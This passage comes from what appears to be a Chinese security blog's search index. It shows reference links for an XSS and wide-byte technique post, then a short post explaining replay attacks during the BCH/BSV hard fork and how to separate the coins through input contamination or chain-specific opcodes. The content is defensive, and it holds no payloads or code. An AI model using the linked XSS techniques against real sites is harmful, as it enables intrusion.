<li><a href="https://www.cesafe.com/5075.html" target="_blank" rel="noopener">https://www.cesafe.com/5075.html</a></li>
<li><a href="http://su.xmd5.org/static/drops/tips-689.html" target="_blank" rel="noopener">http://su.xmd5.org/static/drops/tips-689.html</a></li>
</ul>
<p>宽字节：</p>
<ul>
<li><a href="http://book.2cto.com/201301/14515.html" target="_blank" rel="noopener">http://book.2cto.com/201301/14515.html</a> </li>
<li><a href="http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss" target="_blank" rel="noopener">http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss</a> </li>
<li><a href="http://www.wooyun.org/bugs/wooyun-2010-015969" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-015969</a></li>
<li><a href="https://blog.csdn.net/u013648937/article/details/46629827" target="_blank" rel="noopener">https://blog.csdn.net/u013648937/article/details/46629827</a> </li>
</ul>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 常规渗透 </category>
            
            <category> XSS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XSS </tag>
            
            <tag> Web渗透 </tag>
            
            <tag> 常规渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BCH分叉-重放攻击解决方案]]></title>
      <url>/2018/07/23/BCH%E5%88%86%E5%8F%89/</url>
      <content type="html"><![CDATA[<h3 id="BCH分叉-重放攻击解决方案"><a href="#BCH分叉-重放攻击解决方案" class="headerlink" title="BCH分叉 重放攻击解决方案"></a>BCH分叉 重放攻击解决方案</h3><p>BCH在进行硬分叉：分为BCH和BCHSV</p>
<p>对于分叉前拥有BCH的用户，在分叉后该钱包中会拥有BCH/BSV两种虚拟货币，若是分叉前钱包里有BCH，在硬分叉完成后，这个钱包里也会生成相应的BSV</p>
<h5 id="目的：分离同一地址中-共同存在的BCH和BSV-来防重放攻击"><a href="#目的：分离同一地址中-共同存在的BCH和BSV-来防重放攻击" class="headerlink" title="目的：分离同一地址中 共同存在的BCH和BSV 来防重放攻击"></a>目的：分离同一地址中 共同存在的BCH和BSV 来防重放攻击</h5><h5 id="针对转账业务"><a href="#针对转账业务" class="headerlink" title="针对转账业务"></a>针对转账业务</h5><p>限制条件：该用户账户拥有BCH的同时也拥有BSV<br>利用原理：在用户原意在分叉后转帐 BCH 时，该消息被攻击者广播在BSV链上，导致用户的BSV资产也被转移，受到重放攻击。</p>
<h5 id="INPUT污染法分离："><a href="#INPUT污染法分离：" class="headerlink" title="INPUT污染法分离："></a>INPUT污染法分离：</h5><p>INPUT污染法的原理：<br>就是用分叉后的BCH混入分叉前的BCH，从而达到分离BCH与BSV的目的。<br>具体操作如下：<br>　　    在分叉完成后，用分叉后的BCH币充值到分叉前的BCH币所在的钱包，然后将这个钱包里所有的BCH币（分叉前的BCH和分叉后的BCH）转移到另<br>一个地址。此次交易在BCH链可以成功完成，但是在BSV链上广播时却不能被节点接受，因为这笔交易离存在着分叉后的BCH币。这样子，BSV还是存<br>在于原本的钱包中，达到了将BCH和BSV分离的目的。</p>
<h4 id="构造特有的操作码交易："><a href="#构造特有的操作码交易：" class="headerlink" title="构造特有的操作码交易："></a>构造特有的操作码交易：</h4><p>分叉后的BCH和BSV链的共识机制有一定的区别，主要体现在操作码上，</p>
<p>BCH链上交易时，构造含有 OP_CHECKDATASIG 操作码的输出</p>
<p>BCHSV链上交易时，构造含有 OP_MUL 操作码的输出</p>
]]></content>
      
        <categories>
            
            <category> 区块链安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 区块链安全 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
